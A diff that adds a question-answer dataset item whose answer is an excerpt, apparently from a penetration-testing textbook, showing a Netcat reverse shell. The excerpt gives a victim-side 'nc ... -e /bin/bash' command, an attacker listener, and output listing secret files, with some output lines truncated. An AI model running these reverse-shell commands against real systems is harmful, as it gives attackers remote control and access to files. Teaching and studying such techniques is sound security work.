@@ -1,0 +1,27 @@
+TECHNIQUE / QUESTION:
+Describe the steps or process outlined in the following text: (Context: from Document)
+
+CONTEXT:
+Source: Unknown
+Section: General
+Pages: N/A
+
+METHOD / ANSWER:
+Then on the compromised host (the victim), you can use the nc
+192.168.78.147 666 -e /bin/bash command to connect to the attacking
+system, as demonstrated in Example 6-8.
+Example 6-8 Connecting to the Attacking System (Reverse Shell) Using
+Netcat
+omar@jorel:~$ nc 192.168.78.147 666 -e /bin/bash
+Once the victim system (192.168.78.6) is connected to the attacking system
+(192.168.78.147), you can start invoking commands, as shown in the
+highlighted lines in Example 6-9.
+Example 6-9 Executing Commands in the Victim's System via a Reverse
+Shell
+root@kali:~# nc -lvp 666
+listening on [any] 666 ...
+192.168.78.6: inverse host lookup failed: Unknown hos
+connect to [192.168.78.147] from (UNKNOWN) [192.168.7
+ls
+secret_doc_1.doc
+secret_doc_2.pdf
